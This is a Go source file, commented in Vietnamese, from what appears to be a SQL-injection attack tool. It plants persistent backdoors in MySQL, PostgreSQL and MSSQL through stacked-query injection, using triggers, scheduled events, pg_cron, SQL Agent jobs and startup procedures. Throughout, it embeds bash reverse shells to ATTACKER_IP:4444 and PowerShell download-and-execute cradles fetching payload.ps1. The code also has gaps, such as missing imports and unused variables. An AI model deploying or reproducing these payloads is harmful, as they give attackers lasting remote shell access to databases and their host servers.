package cmd

import (
	"context"
	"fmt"
	"strings"
	"time"

	"go.uber.org/zap"
)

type PersistResult struct {
	Methods     []PersistMethod `json:"methods"`
	Success     bool            `json:"success"`
	Details     string          `json:"details"`
}

type PersistMethod struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Status      string `json:"status"` // success|failed|exists
	Query       string `json:"query,omitempty"`
}

type PersistOptions struct {
	Methods []string
}

type Persistence struct{}

func NewPersistence() *Persistence {
	return &Persistence{}
}

func (p *Persistence) Establish(ctx context.Context, session *Session, opts PersistOptions) (*PersistResult, error) {
	logger := Logger()
	logger.Info("Đang thiết lập cơ chế duy trì", zap.Strings("methods", opts.Methods))
	
	if session.Injection == nil {
		return nil, fmt.Errorf("không có điểm tiêm")
	}
	
	availableMethods := p.getAvailableMethods(session.DBMS.Type)
	
	result := &PersistResult{Methods: []PersistMethod{}}
	
	for _, method := range opts.Methods {
		if _, ok := availableMethods[method]; !ok {
			result.Methods = append(result.Methods, PersistMethod{
				Name:        method,
				Description: "Không được hỗ trợ cho " + session.DBMS.Type,
				Status:      "failed",
			})
			continue
		}
		
		m := availableMethods[method]
		status, query := p.executeMethod(ctx, session, method, m)
		
		result.Methods = append(result.Methods, PersistMethod{
			Name:        method,
			Description: m.Description,
			Status:      status,
			Query:       query,
		})
	}
	
	result.Success = true
	for _, m := range result.Methods {
		if m.Status == "failed" {
			result.Success = false
			break
		}
	}
	
	return result, nil
}

func (p *Persistence) getAvailableMethods(dbms string) map[string]PersistMethod {
	methods := map[string]map[string]PersistMethod{
		"mysql": {
			"trigger": {
				Name:        "trigger",
				Description: "Trigger INSERT/UPDATE/DELETE trên bảng có lưu lượng cao",
				Status:      "",
			},
			"event": {
				Name:        "event",
				Description: "Bộ lập lịch sự kiện MySQL (thực thi lặp lại)",
				Status:      "",
			},
			"udf_autoload": {
				Name:        "udf_autoload",
				Description: "Tự động nạp UDF qua plugin_dir",
				Status:      "",
			},
			"stored_proc": {
				Name:        "stored_proc",
				Description: "Stored procedure với lệnh gọi theo lịch",
				Status:      "",
			},
			"startup": {
				Name:        "startup",
				Description: "File khởi tạo (my.cnf init_file)",
				Status:      "",
			},
		},
		"postgres": {
			"trigger": {
				Name:        "trigger",
				Description: "Trigger trên catalog hệ thống hoặc bảng người dùng",
				Status:      "",
			},
			"event": {
				Name:        "pg_cron",
				Description: "Extension pg_cron cho job theo lịch",
				Status:      "",
			},
			"udf_autoload": {
				Name:        "shared_preload",
				Description: "shared_preload_libraries trong postgresql.conf",
				Status:      "",
			},
			"stored_proc": {
				Name:        "stored_proc",
				Description: "Hàm PL/pgSQL có vòng lặp pg_sleep",
				Status:      "",
			},
		},
		"mssql": {
			"trigger": {
				Name:        "trigger",
				Description: "Trigger DDL/DML trên bảng hệ thống",
				Status:      "",
			},
			"event": {
				Name:        "sql_agent",
				Description: "Job của SQL Server Agent",
				Status:      "",
			},
			"udf_autoload": {
				Name:        "extended_proc",
				Description: "Stored procedure mở rộng (sp_addextendedproc)",
				Status:      "",
			},
			"stored_proc": {
				Name:        "startup_proc",
				Description: "Stored procedure khởi động (sp_procoption)",
				Status:      "",
			},
		},
	}
	
	if m, ok := methods[dbms]; ok {
		return m
	}
	return map[string]PersistMethod{}
}

func (p *Persistence) executeMethod(ctx context.Context, session *Session, methodName string, method PersistMethod) (string, string) {
	var query string
	var err error
	
	switch methodName {
	case "trigger":
		query, err = p.createTrigger(ctx, session)
	case "event":
		query, err = p.createEvent(ctx, session)
	case "udf_autoload", "shared_preload", "extended_proc":
		query, err = p.setupUDFAutoload(ctx, session)
	case "stored_proc", "startup_proc":
		query, err = p.createStoredProc(ctx, session)
	case "startup":
		query, err = p.createStartupFile(ctx, session)
	case "pg_cron":
		query, err = p.createPgCronJob(ctx, session)
	case "sql_agent":
		query, err = p.createSQLAgentJob(ctx, session)
	}
	
	if err != nil {
		return "failed", query
	}
	
	return "success", query
}

func (p *Persistence) createTrigger(ctx context.Context, session *Session) (string, error) {
	// Tìm bảng phù hợp
	table := p.findSuitableTable(ctx, session)
	if table == "" {
		return "", fmt.Errorf("không có bảng phù hợp để tạo trigger")
	}
	
	// Payload: thực thi lệnh khi trigger được kích hoạt
	cmd := "SELECT sys_eval('nohup bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" &')"
	if session.DBMS.Type == "postgres" {
		cmd = "SELECT sys_eval('nohup bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" &')"
	} else if session.DBMS.Type == "mssql" {
		cmd = "EXEC sys_exec 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')\"'"
	}
	
	var triggerSQL string
	switch session.DBMS.Type {
	case "mysql":
		triggerSQL = fmt.Sprintf(`
			CREATE TRIGGER sqli_persist_trigger
			AFTER INSERT ON %s
			FOR EACH ROW
			BEGIN
				%s;
			END
		`, table, cmd)
	case "postgres":
		triggerSQL = fmt.Sprintf(`
			CREATE OR REPLACE FUNCTION sqli_persist_func() RETURNS TRIGGER AS $$
			BEGIN
				PERFORM %s;
				RETURN NEW;
			END;
			$$ LANGUAGE plpgsql;
			
			CREATE TRIGGER sqli_persist_trigger
			AFTER INSERT ON %s
			FOR EACH ROW EXECUTE FUNCTION sqli_persist_func();
		`, cmd, table)
	case "mssql":
		triggerSQL = fmt.Sprintf(`
			CREATE TRIGGER sqli_persist_trigger
			ON %s
			AFTER INSERT
			AS
			BEGIN
				%s;
			END
		`, table, cmd)
	}
	
	payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(triggerSQL, "\n", " "))
	resp, err := p.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return "", err
	}
	
	if strings.Contains(strings.ToLower(resp.String()), "error") {
		return "", fmt.Errorf("tạo trigger thất bại: %s", resp.String()[:200])
	}
	
	return triggerSQL, nil
}

func (p *Persistence) findSuitableTable(ctx context.Context, session *Session) string {
	// Truy vấn các bảng thường xuyên có thao tác INSERT
	query := "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() AND table_type = 'BASE TABLE' ORDER BY table_rows DESC LIMIT 5"
	if session.DBMS.Type == "postgres" {
		query = "SELECT tablename FROM pg_tables WHERE schemaname = 'public' LIMIT 5"
	} else if session.DBMS.Type == "mssql" {
		query = "SELECT TOP 5 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
	}
	
	payload := fmt.Sprintf("' UNION SELECT %s -- ", query)
	resp, _ := p.sendPayload(ctx, session, payload)
	
	// Phân tích tên bảng đầu tiên
	tables := []string{"users", "logs", "sessions", "orders", "audit"}
	for _, t := range tables {
		if strings.Contains(strings.ToLower(resp.String()), t) {
			return t
		}
	}
	
	return "users" // giá trị dự phòng
}

func (p *Persistence) createEvent(ctx context.Context, session *Session) (string, error) {
	cmd := "SELECT sys_eval('nohup bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" &')"
	
	eventSQL := fmt.Sprintf(`
		CREATE EVENT sqli_persist_event
		ON SCHEDULE EVERY 1 MINUTE
		STARTS CURRENT_TIMESTAMP
		DO %s
	`, cmd)
	
	payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(eventSQL, "\n", " "))
	resp, err := p.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return "", err
	}
	
	return eventSQL, nil
}

func (p *Persistence) createPgCronJob(ctx context.Context, session *Session) (string, error) {
	cmd := "SELECT sys_eval('nohup bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" &')"
	
	cronSQL := fmt.Sprintf(`
		SELECT cron.schedule('* * * * *', '%s');
	`, strings.ReplaceAll(cmd, "'", "''"))
	
	payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(cronSQL, "\n", " "))
	resp, err := p.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return "", err
	}
	
	return cronSQL, nil
}

func (p *Persistence) createSQLAgentJob(ctx context.Context, session *Session) (string, error) {
	// Tạo job SQL Server Agent bằng T-SQL
	jobSQL := `
		EXEC msdb.dbo.sp_add_job @job_name = 'sqli_persist_job', @enabled = 1;
		EXEC msdb.dbo.sp_add_jobstep @job_name = 'sqli_persist_job', @step_name = 'shell', @subsystem = 'CMDEXEC', @command = 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')"';
		EXEC msdb.dbo.sp_add_jobschedule @job_name = 'sqli_persist_job', @name = 'every_minute', @freq_type = 4, @freq_interval = 1, @freq_subday_type = 4, @freq_subday_interval = 1;
		EXEC msdb.dbo.sp_add_jobserver @job_name = 'sqli_persist_job';
	`
	
	payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(jobSQL, "\n", " "))
	resp, err := p.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return "", err
	}
	
	return jobSQL, nil
}

func (p *Persistence) setupUDFAutoload(ctx context.Context, session *Session) (string, error) {
	// UDF đã được nạp thông qua shell injection
	// Bước này nhằm duy trì trạng thái qua các lần khởi động lại
	var query string
	
	switch session.DBMS.Type {
	case "mysql":
		// MySQL tự động nạp UDF từ plugin_dir
		query = "SELECT 'UDF persists via plugin_dir'"
	case "postgres":
		// Yêu cầu sửa postgresql.conf (shared_preload_libraries)
		query = "SELECT 'Requires postgresql.conf modification for shared_preload_libraries'"
	case "mssql":
		// Procedure mở rộng được lưu trong master.dbo
		query = "SELECT 'Extended procs persist in master database'"
	}
	
	return query, nil
}

func (p *Persistence) createStoredProc(ctx context.Context, session *Session) (string, error) {
	cmd := "sys_eval('nohup bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" &')"
	if session.DBMS.Type == "mssql" {
		cmd = "sys_exec 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')\"'"
	}
	
	var procSQL string
	switch session.DBMS.Type {
	case "mysql":
		procSQL = fmt.Sprintf(`
			CREATE PROCEDURE sqli_persist_proc()
			BEGIN
				SELECT %s;
			END
		`, cmd)
	case "postgres":
		procSQL = fmt.Sprintf(`
			CREATE OR REPLACE FUNCTION sqli_persist_proc() RETURNS VOID AS $$
			BEGIN
				PERFORM %s;
			END;
			$$ LANGUAGE plpgsql;
		`, cmd)
	case "mssql":
		procSQL = fmt.Sprintf(`
			CREATE PROCEDURE sqli_persist_proc
			AS
			BEGIN
				EXEC %s;
			END
			
			EXEC sp_procoption 'sqli_persist_proc', 'startup', 'on';
		`, cmd)
	}
	
	payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(procSQL, "\n", " "))
	resp, err := p.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return "", err
	}
	
	return procSQL, nil
}

func (p *Persistence) createStartupFile(ctx context.Context, session *Session) (string, error) {
	// MySQL init_file - yêu cầu quyền FILE và khởi động lại server
	cmd := "SELECT sys_eval('nohup bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" &')"
	
	initSQL := fmt.Sprintf(`
		SELECT '%s' INTO OUTFILE '/var/lib/mysql/init_sqli.sql'
	`, cmd)
	
	payload := fmt.Sprintf("' ; %s -- ", strings.ReplaceAll(initSQL, "\n", " "))
	resp, err := p.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return "", err
	}
	
	return initSQL, nil
}

func (p *Persistence) sendPayload(ctx context.Context, session *Session, payload string) (*resty.Response, error) {
	client := session.GetClient()
	param := session.Injection.Parameter
	
	switch session.Injection.Type {
	case "GET":
		u, _ := url.Parse(session.URL)
		q := u.Query()
		q.Set(param, payload)
		u.RawQuery = q.Encode()
		return client.R().Get(u.String())
	case "POST":
		data := session.Data
		if strings.Contains(data, "=") {
			pairs := strings.Split(data, "&")
			for i, p := range pairs {
				kv := strings.SplitN(p, "=", 2)
				if len(kv) == 2 && kv[0] == param {
					pairs[i] = param + "=" + payload
				}
			}
			data = strings.Join(pairs, "&")
		} else {
			data = param + "=" + payload
		}
		return client.R().SetBody(data).Post(session.URL)
	case "COOKIE":
		return client.R().SetCookie(&http.Cookie{Name: param, Value: payload}).Get(session.URL)
	case "HEADER":
		return client.R().SetHeader(param, payload).Get(session.URL)
	}
	return nil, fmt.Errorf("kiểu không được hỗ trợ")
}

func (p *Persistence) sendStackedPayload(ctx context.Context, session *Session, payload string) (*resty.Response, error) {
	// Yêu cầu hỗ trợ truy vấn xếp chồng
	if !session.Injection.IsStackable {
		return nil, fmt.Errorf("truy vấn xếp chồng không được hỗ trợ")
	}
	return p.sendPayload(ctx, session, payload)
}
